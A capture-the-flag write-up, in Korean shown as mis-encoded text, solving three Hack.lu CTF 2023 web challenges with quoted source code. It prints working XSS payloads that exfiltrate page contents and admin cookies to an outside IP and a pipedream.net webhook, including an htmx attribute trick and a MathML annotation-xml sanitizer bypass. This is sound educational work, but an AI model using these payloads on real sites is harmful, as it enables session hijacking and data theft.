---
layout: post
title: Hack.lu CTF 2023
description: CTF Write-up
tags: Hack.lu CTF 
category: ctf
---

### CTFtime: https://ctftime.org/event/1921
### Official URL: https://flu.xxx/

# based-encoding

## app.py
```python
def init_db():
    db, cur = get_cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, admin INTEGER)")
    cur.execute("INSERT INTO accounts (username, password, admin) VALUES ('admin', ?, 1)", [admin_password])

    cur.execute("CREATE TABLE IF NOT EXISTS encodings (id TEXT NOT NULL UNIQUE, text TEXT NOT NULL, creator, expires INTEGER DEFAULT 0)")
    cur.execute("INSERT INTO encodings (id, text, creator, expires) VALUES (?, ?, 'admin', 0)", [secrets.token_hex(20), FLAG])
    db.commit()
    db.close()
```
    
accounts í…Œì´ë¸”ì— admin ê³„ì •ì„ ìƒì„±í•˜ê³ , encodings í…Œì´ë¸”ì— 20ìë¦¬ 16ì§„ìˆ˜ ëœë¤ ê°’ê³¼ text ì»¬ëŸ¼ì— FLAGë¥¼ ë„£ì–´ì¤€ë‹¤.

```python
def create_encoding(username, text):
    db, cursor = get_cursor()
    id_val = secrets.token_hex(20)
    expires = int(time.time()) + 60 * 60
    # text field includes flag
    cursor.execute("INSERT INTO encodings (id, text, creator, expires) VALUES (?, ?, ?, ?)", [id_val, text, username, expires])
    db.commit()
    return id_val

@app.route("/create", methods=["GET", "POST"])
def create():
    if not session:
        flash("Please log in")
        return redirect("/login")
    if request.method == "GET":
        return render_template("create.html", logged_out=False)
    elif request.method == "POST":
        if not request.form["text"]:
            return "Missing text"
        text = request.form["text"]
        if len(text) > 1000:
            flash("Too long!")
            return redirect("/create")
        encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
        # insert encoding text in db
        encoding_id = create_encoding(session["username"], encoded)
        
        return redirect(f"/e/{encoding_id}")
```

/createëŠ” based91.encode()ë¥¼ í˜¸ì¶œí•˜ì—¬ ì¸ì½”ë”©ì„ ì§„í–‰í•˜ê³  ì¸ì½”ë”© ê°’ì„ create_encoding()ì— ì„¸ì…˜ ê°’ê³¼ í•¨ê»˜ ë„˜ê¸´ë‹¤. encodings í…Œì´ë¸”ì— ë°ì´í„°ë¥¼ ì‚½ì…í•˜ê³  /e/{encoding_id} ê²½ë¡œë¡œ redirect ì‹œí‚¨ë‹¤. 

```python

@app.route("/e/<encoding_id>")
def getEncoding(encoding_id):
    logged_out = session.get("username", None) is None
    encoding = get_encoding(encoding_id)
    return render_template("view_encoding.html", encoding=encoding, logged_out=logged_out)

def get_encodings(username):
    db, cursor = get_cursor()
    cursor.execute("SELECT id, text, expires FROM encodings WHERE creator = ?", [username])
    rows = cursor.fetchall()
    for i, row in enumerate(rows):
        if row[2] > 0 and row[2] < int(time.time()):
            cursor.execute("DELETE FROM encodings WHERE id = ?", [row[0]])
            db.commit()
            rows[i] = None
    return [row for row in rows if row is not None]

@app.route("/")
def mainRoute():
    if not session:
        return redirect("/login")
    encodings = get_encodings(session["username"])
    return render_template("index.html", encodings=encodings, logged_out=False)   
```
   
ë©”ì¸ í˜ì´ì§€ì—ì„œ get_encodings()ë¥¼ í˜¸ì¶œí•˜ì—¬ ìƒì„±ëœ ì¸ì½”ë”© ê°’ë“¤ì„ ê°€ì ¸ì™€ì„œ ë¿Œë ¤ì¤€ë‹¤. /e/{encoding_id} ê²½ë¡œë¡œ ì ‘ê·¼í•˜ë©´, ì¸ì½”ë”©ëœ ê°’ì„ view_encoding.htmlì— í‘œì‹œí•´ì¤€ë‹¤.    
      
ëœë¤ìœ¼ë¡œ ìƒì„±ëœ id ê°’ì„ ì•Œì•„ë‚´ì•¼ textì— ì ‘ê·¼í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— FLAGë¥¼ ì–»ê¸° ìœ„í•´ì„œëŠ” init_db()ê°€ ì‹¤í–‰ë  ë•Œ encodings í…Œì´ë¸”ì— ìƒì„±ëœ id ê°’ì„ ì•Œì•„ë‚´ì•¼í•œë‹¤. 

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if not session:
        flash("Please log in")
        return redirect("/login")
    if request.method == "GET":
        return render_template("report.html", logged_out=False)

    value = request.form.get("id")

    if not value or not re.match(r"^[a-f0-9]{40}$", value):
        flash("invalid value!")
        return render_template("report.html", logged_out=False)
    subprocess.Popen(["timeout", "-k" "15", "15", "node", "adminbot.js", base_url, admin_password, value], shell=False)
    flash("An admin going there.")
    return render_template("report.html", logged_out=False)
```
    
/report ê²½ë¡œë¡œ ê°€ë©´, í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•˜ì—¬ adminbot.jsë¥¼ ì‹¤í–‰í•˜ì—¬ /e/{encoding_id} ê²½ë¡œì— ì ‘ê·¼í•œë‹¤. <strong>XSSë¥¼ í†µí•´ adminbotì´ FLAGê°€ ì €ì¥ëœ id ê°’ì„ ì½ê³  location.hrefë¡œ id ê°’ì„ ë„˜ê¸°ë©´ ë  ê²ƒ ê°™ë‹¤.</strong>

```python
@app.after_request
def add_header(response):
    response.headers["Content-Security-Policy"] = "script-src 'unsafe-inline';"
    return response
```
CSP ë˜í•œ `<script>`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ë˜ì–´ìˆì–´ XSS ê³µê²©ì„ ìˆ˜í–‰í•´ì£¼ë©´ ë  ê²ƒ ê°™ë‹¤.   

ì¸ì½”ë”© ê²°ê³¼ ê°’ì´ ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ì´ì–´ì•¼ í•˜ê¸° ë•Œë¬¸ì— `<script>~~</script>`ë¥¼ ë””ì½”ë”©í•œ ê²°ê³¼ ê°’ì„ ì…ë ¥ìœ¼ë¡œ ì£¼ë©´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  ìˆ˜ ìˆë‹¤. 

```python
base91_alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
	'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
	'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '#', '$',
	'%', 'â‚¬', '(', ')', '*', '+', ',', 'Â°', '/', ':', ';', '<', '=',
	'>', '?', '@', '[', ']', '^', '_', '`', '{', '|', '}', '~', '"']

decode_table = dict((v,k) for k,v in enumerate(base91_alphabet))

def decode(encoded_str):
    ''' Decode Base91 string to a bytearray '''
    v = -1
    b = 0
    n = 0
    out = bytearray()
    for strletter in encoded_str:
        if not strletter in decode_table:
            print(strletter)
            continue
        c = decode_table[strletter]
        if(v < 0):
            v = c
        else:
            v += c*91
            b |= v << n
            n += 13 if (v & 8191)>88 else 14
            while True:
                out += struct.pack('B', b&255)
                b >>= 8
                n -= 8
                if not n>7:
                    break
            v = -1
    if v+1:
        out += struct.pack('B', (b | v << n) & 255 )
    return out
```
         
`based91.py` íŒŒì¼ì— decode() í•¨ìˆ˜ê°€ ìˆê¸° ë•Œë¬¸ì— ì´ë¥¼ í™œìš©í•˜ë©´ ë  ê²ƒ ê°™ë‹¤.    
      
ë˜í•œ, alphabet í…Œì´ë¸”ì„ ë³´ë©´ ì§€ì›í•˜ëŠ” ë¬¸ìë“¤ì´ í•œì •ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.     
     
ê°€ì¥ í° ê±¸ë¦¼ëŒì€ .(dot)ì„ ì‚¬ìš©í•˜ì§€ ëª»í•œë‹¤ëŠ” ì ì´ì—ˆë‹¤. Webhookì„ ì§€ì›í•˜ëŠ” ì‚¬ì´íŠ¸ë“¤ì˜ ë„ë©”ì¸ì— .(dot)ì´ í¬í•¨ëœ ê²½ìš°ê°€ ëŒ€ë‹¤ìˆ˜ì˜€ê¸°ì— ê°œì¸ ì›¹ ì„œë²„ë¥¼ í•„ìš”í–ˆë‹¤.     
     
AWS EC2 ì„œë²„ë¥¼ í•˜ë‚˜ íŒŒì„œ http://3.35.8.40/?d=hello ì´ì™€ ê°™ì´ ì…ë ¥ ë°›ì„ ìˆ˜ ìˆëŠ” í™˜ê²½ì„ êµ¬ì¶•í•´ì£¼ì—ˆë‹¤.     
     
ë‹¤ìŒìœ¼ë¡œ, XSS Payloadë¥¼ ì‘ì„±í•˜ëŠ”ë° ì‚½ì§ˆì„ ë§ì´ í–ˆë‹¤.    
    
`<script>location.href='http://{ip}/?d='+document["cookie"]</script>//`

admin ì„¸ì…˜ íƒˆì·¨ë¥¼ ì‹œë„í•´ë³´ì•˜ì§€ë§Œ, httpOnlyë¡œ ì„¤ì •ë˜ì–´ìˆì–´ì„œ íƒˆì·¨í•  ìˆ˜ ì—†ì—ˆë‹¤.

ê·¸ë˜ì„œ, ë‹¤ìŒ ë°©ë²•ì¸ "/" ê²½ë¡œì— admin ê³„ì •ì˜ /e/{id} ê°’ì„ íƒˆì·¨í•˜ëŠ” ê²ƒì´ì—ˆë‹¤.
     
/reportë¥¼ ìˆ˜í–‰í•˜ë©´, adminbotì€ https://based.skin/e/{id} ê²½ë¡œë¥¼ ë°©ë¬¸í•˜ëŠ”ë° id ê°’ì€ https://based.skin/ ê²½ë¡œì— ìˆê¸°ì— fetch(), XMLHttpRequest() ë“±ì„ í™œìš©í•˜ì—¬ Payloadë¥¼ ì‘ì„±í•˜ê¸°ë¡œ ë°©í–¥ì„ ì¡ì•˜ë‹¤.     
    
`</h2><script>var/**/test="";fetch("/")["then"](response=>response["text"]())["then"](text=>{test=text;});window["location"]["href"]="http://52627496/?d="+test</script>`
     
fetch("/") ì´í›„ HTML ê²°ê³¼ë¥¼ test ë³€ìˆ˜ì— ë„£ì–´ location.hrefë¥¼ ìˆ˜í–‰í•˜ë„ë¡ ì‹œë„í–ˆëŠ”ë° consoleì—ì„œëŠ” ì˜ ë˜ëŠ”ë° ì‹¤ì œë¡œ ì…ë ¥ ê°’ìœ¼ë¡œ ì¤¬ì„ ë•Œ, fetch() ì‹œì ê³¼ location.hrefê°€ ì‹¤í–‰ë˜ëŠ” ì‹œì ì´ ë‹¬ë¼ì„œì¸ì§€ ì‹¤í–‰ì´ ë˜ì§€ ì•Šì•˜ë‹¤.     

`</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="http://52627496/?d="+text;});</script>////`
     
ê·¸ë˜ì„œ, fetch() ì•ˆì—ì„œ location.hrefê°€ ì‹¤í–‰ë˜ë„ë¡ í–ˆëŠ”ë° text ê°’ì´ ë„˜ì–´ì˜¤ì§€ ì•Šì•„ì„œ ë°ì´í„° í¬ê¸° ë•Œë¬¸ì¸ê°€ ì‹¶ì–´ì„œ ì¼ë¶€ë§Œ ì „ë‹¬í•˜ë„ë¡ êµ¬í˜„í•´ë³´ì•˜ë‹¤.
     
`</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="http://52627496/?d="+text["substring"](50,52);});</script>////`
    
text.substringì„ í™œìš©í•˜ì—¬ ë°ì´í„°ì˜ ì¼ë¶€ë¥¼ ì „ë‹¬í•˜ë‹ˆ ì˜ ì „ë‹¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.

`</h2><script>fetch("/")["then"](response=>response["text"]())["then"](text=>{var/**/l=text["search"]("/e/");window["location"]["href"]="http://52627496/?d="+text["substring"](l,l+50);});</script>////`   
    
ì¶”ê°€ì ìœ¼ë¡œ, text.searchë¥¼ í™œìš©í•˜ì—¬ /e/ ë¬¸ìì—´ì˜ indexë¥¼ ì°¾ê³  ë’¤ì— ë¶€ë¶„ì„ ê°€ì ¸ì˜¤ë„ë¡ í–ˆë‹¤.    
     
```bash
31.22.123.45 - - [15/Oct/2023:06:25:23 +0000] "GET /?d=f- HTTP/1.1" 200 205 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.62 Safari/537.36"

31.22.123.45 - - [15/Oct/2023:06:37:15 +0000] "GET /?d=/e/98def9f5621fc998b913aea476639ebd1a862c43%22%3E98def HTTP/1.1" 200 254 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.62 Safari/537.36"
```     
      
ê°œì¸ ì„œë²„ì˜ access.log ë‚´ìš©ì„ ë³´ë©´, ê°’ì´ ì˜ ë„˜ì–´ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. 31.22.123.45 (adminbot)ì´ ë°©ë¬¸í•œ ë¡œê·¸ì´ë‹¤. ì´ì œ `/e/98def9f5621fc998b913aea476639ebd1a862c43%22%3E98def`ì— ì ‘ê·¼í•´ì£¼ë©´ ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.    
    
`</h2><script>fetch("/e/98def9f5621fc998b913aea476639ebd1a862c43")["then"](response=>response["text"]())["then"](text=>{var/**/l=text["search"]("subtitle");window["location"]["href"]="http://52627496/?d="+text["substring"](l,l+50);});</script>////`

Payloadë¥¼ ì¡°ê¸ˆ ìˆ˜ì •í•˜ì—¬ ì „ë‹¬í•´ì£¼ë©´ ì•„ë˜ì™€ ê°™ì´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.    
      
<img src="/assets/images/ctf/2023/hack.lu/base-encoding/flag.PNG" width="700px"/>   
    
# awesomenotes-1    

### src/main.rs

```rust
async fn get_note(
    Path(note): Path<String>,
    TypedHeader(cookie): TypedHeader<Cookie>,
) -> Result<Html<String>, (StatusCode, &'static str)> {
    // path = flag
    if &note == "flag" {
        let Some(name) = cookie.get("session") else {
            return Err((StatusCode::UNAUTHORIZED, "Missing session cookie"));
        };
        // must get the admin session 
        if name != std::env::var("ADMIN_SESSION").expect("Missing ADMIN_SESSION") {
            return Err((
                StatusCode::UNAUTHORIZED,
                "You are not allowed to read this note",
            ));
        }
        return Ok(Html(fs::read_to_string("flag.txt").expect("Flag missing")));
    }
    if note.chars().any(|c| !c.is_ascii_hexdigit()) {
        return Err((StatusCode::BAD_REQUEST, "Malformed note ID"));
    }
    let Ok(note) = fs::read_to_string(format!("public/upload/{:}", note)) else {
        return Err((StatusCode::NOT_FOUND, "Note not found"));
    };
    Ok(Html(note))
}
```    
      
FLAG íšë“ì„ ìœ„í•´ `ADMIN_SESSION` ê°’ì„ ì•Œì•„ë‚´ì•¼í•œë‹¤. XSS ê³µê²© í˜¹ì€ LFIë¡œ `/proc/self/environ`ë¥¼ ì½ì–´ ê°’ì„ ì•Œì•„ë‚´ëŠ” ë°©ì‹ìœ¼ë¡œ ë³´ì¸ë‹¤.        

```rust
async fn upload_note(
    mut multipart: Multipart,
) -> (StatusCode, Result<HeaderMap<HeaderValue>, &'static str>) {
    let mut body: Option<String> = None;

    // check until the body of packet is showed
    while let Some(field) = multipart.next_field().await.unwrap() {
        let Some(name) = field.name() else { continue };
        if name != "note" {
            continue;
        }
        let Ok(data) = field.text().await else {
            continue;
        };
        body = Some(data);
        break;
    }
    let Some(body) = body else {
        return (StatusCode::BAD_REQUEST, Err("Malformed formdata"));
    };
    if body.len() > 5000 {
        return (StatusCode::PAYLOAD_TOO_LARGE, Err("Note too big"));
    }

    // use h1, p, div, hx- 
    let safe = ammonia::Builder::new()
        .tags(hashset!["h1", "p", "div"])
        .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_string();
    let mut name = [0u8; 32];
    // random name generation
    fs::File::open("/dev/urandom")
        .unwrap()
        .read_exact(&mut name) // generate randomly name
        .expect("Failed to read urandom");
    let name = String::from_iter(name.map(|c| format!("{:02x}", c)));
    // after filtering, write
    fs::write(format!("public/upload/{:}", name), safe).expect("Failed to write note");
    (
        StatusCode::FOUND,
        Ok(HeaderMap::from_iter([(
            LOCATION,
            format!("/note/{:}", name).parse().unwrap(),
        )])),
    )
}
```
     
`upload_note` í•¨ìˆ˜ëŠ” ìœ ì €ì— ì˜í•´ ì…ë ¥ëœ body ê°’ì„ `body` ë³€ìˆ˜ì— ì €ì¥í•œ í›„, XSS ê³µê²© ë°©ì§€ë¥¼ ìœ„í•´ `ammonia`ë¥¼ ì‚¬ìš©í•˜ì—¬ íƒœê·¸(h1, p, div) ë° ì†ì„±(hx-)ë§Œ ì‚¬ìš© ê°€ëŠ¥í•˜ë„ë¡ ì œí•œí•˜ê³  ìˆë‹¤.      
      
ì´í›„, `/dev/urandom`ì—ì„œ ëœë¤ ê°’ì„ ê°€ì ¸ì™€ 16ì§„ìˆ˜ë¡œ êµ¬ì„±ëœ ëœë¤ ê°’ì„ íŒŒì¼ ëª…ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ì—…ë¡œë“œë¥¼ ì§„í–‰í•œë‹¤.       

íŒŒì¼ ëª…ì„ ì¡°ì‘í•  ìˆ˜ ì—†ëŠ” ìƒíƒœì´ê¸°ì— Path Traversalë¥¼ í†µí•´ LFIëŠ” ë¶ˆê°€ëŠ¥í•˜ê³ , `ammonia`ì˜ `.add_generic_attribute_prefixes(&["hx-"])` ë¶€ë¶„ì´ ëˆˆì— ë“¤ì–´ì™”ë‹¤. ê·¸ë˜ì„œ, HTMLì— hx-ë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ë¶€ë¶„ì´ ìˆëŠ”ì§€ ì‚´í´ë³´ì•˜ë‹¤.   
     
## public/note.html    
```html
<html>
    <head>
        <script src="https://unpkg.com/htmx.org@1.9.5" integrity="sha384-xcuj3WpfgjlKF+FXhSQFQ0ZNr39ln+hwjN3npfM9VBnUskLolQAcN80McRIVOPuO" crossorigin="anonymous"></script>
        <!-- SKIP --> 
    </head>
    <body>
        <!-- SKIP --> 
        <div 
            class="note-body glow-red note-body-loading" 
            hx-get="/api/note/" 
            hx-on::config-request="event.detail.path += window.location.pathname.split('/').pop()"
            hx-on::after-swap="let l = event.detail.target;
            l.parentNode.classList.add('note-body-done', 'glow-green');
            l.parentNode.classList.remove('note-body-loading', 'glow-red'); 
            "
            hx-trigger="load delay:0.001s"
            hx-target="find #content"
            >
        <div id="content"></div>
        <!-- SKIP --> 
    </body>
</html>
```      
     
`note.html`ì—ì„œ HTMX ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ Noteì˜ Content ë‚´ìš©ì„ ê°€ì ¸ì˜¤ëŠ” ë¡œì§ì´ ìˆì—ˆë‹¤. ì´ë¥¼ í™œìš©í•´ XSS ê³µê²©ì„ ìˆ˜í–‰í•˜ë©´ ë  ê²ƒ ê°™ì•˜ë‹¤.   

```rust
async fn take_report(Form(report): Form<Report>) -> Result<String, (StatusCode, &'static str)> {
    // No filter params(link and captcha)
    let params = [("link", report.link), ("recaptcha", report.captcha)];
    let client = reqwest::Client::new();
    let res = client
        .post(format!(
            "http://{:}",
            std::env::var("BOT_HOST").expect("Missing BOT_HOST")
        ))
        .form(&params)
        .send()
        .await
        .expect("Can't request bot");
    if res.status() != StatusCode::OK {
        return Err((StatusCode::BAD_REQUEST, "Report failed"));
    }
    Ok(
        std::fs::read_to_string("public/static/fragment/report_success.html")
            .expect("Missing fragment"),
    )
}
```
      
ì¶”ê°€ì ìœ¼ë¡œ, `take_report` í•¨ìˆ˜ì—ì„œ ë´‡ì„ ì´ìš©í•˜ì—¬ ìœ ì €ê°€ ì…ë ¥í•œ `link`ì— ì ‘ì†í•˜ëŠ” ì½”ë“œê°€ ì¡´ì¬í•´ì„œ HTMXë¥¼ ì‚¬ìš©í•˜ì—¬ XSS ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ ì˜¬ë°”ë¥¸ ë°©ì‹ì„ì„ í™•ì‹ í•  ìˆ˜ ìˆì—ˆë‹¤. 
    
```html
<div hx-get="/note/1577d24c9046fa52eeb59b0b7806336d40cab5464ca601312cee840f54ed7132" hx-trigger="load delay:1s" hx-target="closest div"></div>
<div></div>
```    
     
`hx-get`ì„ í†µí•´ GET ìš”ì²­ì„ ë‚ ë¦¬ê³  ë°›ì€ ê²°ê³¼ ê°’ì´ ì¸ì ‘í•œ `<div>` íƒœê·¸ì— ë°˜ì˜ë˜ëŠ”ì§€ í™•ì¸í•´ë³´ì•˜ë‹¤.
     
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-1/1.PNG" width="700px">
     
`<div id="content">` ì•ˆì— ê²°ê³¼ ê°’ì´ ì˜ ë“¤ì–´ê°€ëŠ” ê²ƒì´ í™•ì¸ë˜ì—ˆë‹¤. ë‹¤ìŒìœ¼ë¡œ, `hx-get` ì†ì„± ê°’ì— `<div hx-get="fetch('https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie)" hx-trigger="load delay:1s" hx-target="closest div"></div><div></div>`ë¥¼ ë„£ì–´ ì‹¤í–‰í•´ë´¤ì§€ë§Œ ìš”ì²­ì´ ìˆ˜í–‰ë˜ì§€ ì•Šì•˜ë‹¤.     
     
`BurpSuite Proxy`ë¥¼ ì‚¬ìš©í•´ì„œ Requestë¥¼ ì‚´í´ë´¤ì„ ë•Œ, `GET /note/fetch('https://enbjsc6lizc3g.x.pipedream.net/?d=%27+document.cookie){note} HTTP/2` ìš”ì²­ì„ ë³´ë‚´ fetch() ì´í›„ note ì´ë¦„ì´ í•©ì³ì ¸ ì˜¬ë°”ë¥´ì§€ ì•Šì€ ê²½ë¡œë¡œ ì ‘ê·¼í•˜ì—¬ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²ƒì„ í™•ì¸í–ˆë‹¤. ì—¬ê¸°ì„œ ì™¸ë¶€ ì‚¬ì´íŠ¸ì— ìš”ì²­ì„ ë³´ë‚´ëŠ” ë°©ë²•ì„ ì°¾ì§€ ëª»í•´ ì‚½ì§ˆì„ ë§ì´í•´ì„œ ëŒ€íšŒ ë‹¹ì‹œì— ë¬¸ì œë¥¼ í’€ì§€ ëª»í–ˆë‹¤.    
       
https://htmx.org/events/
```
Event - htmx:afterRequest
This event is triggered after an AJAX request has finished either in the case of a successful request (although one that may have returned a remote error code such as a 404) or in a network error situation. This event can be paired with htmx:beforeRequest to wrap behavior around a request cycle.
```
ëŒ€íšŒê°€ ëë‚˜ê³ , write-upì„ ë³´ë‹ˆ `htmx:afterRequest`ë¥¼ ì‚¬ìš©í•œ í’€ì´ê°€ ìˆì—ˆë‹¤. `htmx:afterRequest`ëŠ” AJAX ìš”ì²­ ì´í›„ Requestë¥¼ í•œ ë²ˆ ë” ì „ì†¡í•˜ëŠ” ì†ì„±ìœ¼ë¡œ PayloadëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.     
      
```html
<div hx-get="/api/note/01fe5e3e71de0713da71533027bf0e267e6661f8fba78e04711521a28577285c" hx-trigger="load" hx-target="this" hx-on="htmx:afterRequest: fetch('https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie)"></div>
```

ê±°ì˜ ë‹¤ ì™”ëŠ”ë° `hx-get` ìš”ì²­ ì´í›„ `htmx:afterRequest`ê°€ ìˆ˜í–‰ë˜ë©° ì¿ í‚¤ ê°’ì„ ì „ë‹¬í•œë‹¤. ì¦‰, ìœ„ ë‚´ìš©ì„ Noteì˜ ì…ë ¥ ê°’ìœ¼ë¡œ ì „ë‹¬í•˜ê³  Reportë¥¼ í†µí•´ adminbotì´ ì½ê²Œ í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ì„¸ì…˜ì„ íƒˆì·¨í•  ìˆ˜ ìˆê²Œ ëœë‹¤. 
     
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-1/2.PNG" width="700px">     

ì–»ì€ ì„¸ì…˜ ê°’ì„ ì¿ í‚¤ì— ë„£ì–´ì£¼ê³  `/note/flag`ì— ì ‘ê·¼í•´ì£¼ë©´ ëœë‹¤. 
           
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-1/3.PNG" width="700px">        
       
`/note/flag`ì— ì ‘ê·¼í•´ì£¼ë©´ FLAG ê°’ì´ ì˜ ë³´ì´ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.    
      
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-1/4.PNG" width="700px">

# awesomenotes-2    
        
### src/main.rs    
    
```rust
async fn upload_note(
    mut multipart: Multipart,
) -> (StatusCode, Result<HeaderMap<HeaderValue>, &'static str>) {

    /* SKIP */

    let safe = ammonia::Builder::new()
        .add_tags(TAGS)
        .add_tags(&["style"])
        .rm_clean_content_tags(&["style"])
        /*
            Thank god we don't have any more XSS vulnerabilities now ğŸ™
        */
        // .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_string();

    /* SKIP */
}
```    
awesomenotes-1ê³¼ ë‹¬ë¦¬ `hx-`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ê²Œ ë˜ê³ , `math_tags.rs`ì˜ `TAGS` ë°°ì—´ì— ì¡´ì¬í•˜ëŠ” íƒœê·¸ë“¤ê³¼ `style` íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ë³€ê²½ë˜ì—ˆë‹¤. ë˜í•œ, `<style>` íƒœê·¸ ì•ˆì— ì¡´ì¬í•˜ëŠ” ë‚´ìš©ì€ í•„í„°ë§ í•˜ì§€ ì•Šë„ë¡ í•˜ê³  ìˆë‹¤.
    
```html
<h1>Example note</h1>
<p>Don't forget about that exam next monday!</p>
<math xmlns='http://www.w3.org/1998/Math/MathML'>
<mrow>
  <mi>E</mi>
  <mo>=</mo>
  <msup>
    <mi>mc</mi>
    <mn>2</mn>
  </msup>
</mrow>
</math>
<br>
<br>
<img class="note-img" src="https://i.ibb.co/VxZVxyw/tweet-1688724457035075584-20230917-130820-via-10015-io.png">

<style>
    .note-body img {
        border-radius: 20px;
        box-shadow: 0 0 40px #000000a0;
        object-fit: contain;
        width: 500px;
    }
</style>
```    
`/create` ê²½ë¡œì— ê°€ë©´ `<math>`, `<img>`, `<style>` ë“±ì„ ì‚¬ìš©í•œ HTML ì½”ë“œê°€ ì í˜€ì ¸ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.   
    
ìœ„ íƒœê·¸ë“¤ì„ í™œìš©í•˜ì—¬ XSS ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒ ê°™ì•„ `MathML XSS` ì‚¬ë¡€ë“¤ì„ ì°¾ì•„ë³´ì•˜ë‹¤.     

```html
<math><annotation-xml encoding="text/html"><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></math>

<math><annotation-xml encoding="text/html"><script>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</script></math>
```
https://bugs.chromium.org/p/chromium/issues/detail?id=805924         
    
MathML XSS ì·¨ì•½ì  ì‚¬ë¡€ê°€ ì¡´ì¬í–ˆê³ , `<annotation-xml>`ì— ëŒ€í•´ ì°¾ì•„ë³´ì•˜ë‹¤.

https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

***math annotation-xml: if it has an attribute called encoding whose value is equal to either text/html or application/xhtml+xml***   
    
math annotation-xml íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ text/html ì¸ì½”ë”© ë°©ì‹ì„ ì‚¬ìš©í•˜ë©´ annotation-xml íƒœê·¸ ì•ˆì— contentê°€ math namespaceê°€ ì•„ë‹Œ html namespaceë¡œ ì¸ì‹í•˜ê²Œ ë˜ëŠ” ê²ƒì´ë‹¤.   
     
ì¦‰, html namespaceë¡œ ì¸ì‹ëœë‹¤ëŠ” ê²ƒì€ html ì½”ë“œê°€ textê°€ ì•„ë‹Œ DOMì— ì¶”ê°€ëœë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤.   
     
```html
<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>
```  

Payloadë¥¼ ìœ„ì™€ ê°™ì´ ì‘ì„±í•´ì„œ ì‹¤í–‰ì‹œì¼œë³´ë‹ˆ ì•„ë˜ì™€ ê°™ì´ `alert(1)`ê°€ ì˜ ì‹¤í–‰ë˜ì—ˆë‹¤.     
    
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-2/1.PNG" width="700px">    

ì„¸ì…˜ ê°’ì„ ë°›ì•„ì˜¤ê¸° ìœ„í•´ Webhookì„ ì‚¬ìš©í•˜ì—¬ Payloadë¥¼ ì‘ì„±í•´ì£¼ì—ˆë‹¤.   

```html
<math><annotation-xml encoding="text/html"><style><img src=x onerror="javascript:location.href='https://enbjsc6lizc3g.x.pipedream.net/?d='+document.cookie"></style></annotation-xml></math>
```
    
ë…¸íŠ¸ ì‘ì„± í›„, Report í•´ì£¼ë©´ ì„¸ì…˜ ê°’ì´ ì˜ ë°›ì•„ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.   

### Admin Session 
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-2/2.PNG" width="700px">      
    
### Session Registration in Cookie    
<img src="/assets/images/ctf/2023/hack.lu/awesomenotes-2/3.PNG" width="700px">   
         
ë°›ì€ ì„¸ì…˜ ê°’ì„ ì¿ í‚¤ì— ì¶”ê°€í•´ì£¼ê³  `/note/flag`ì— ì ‘ì†í•˜ë©´ FLAG íšë“!!!

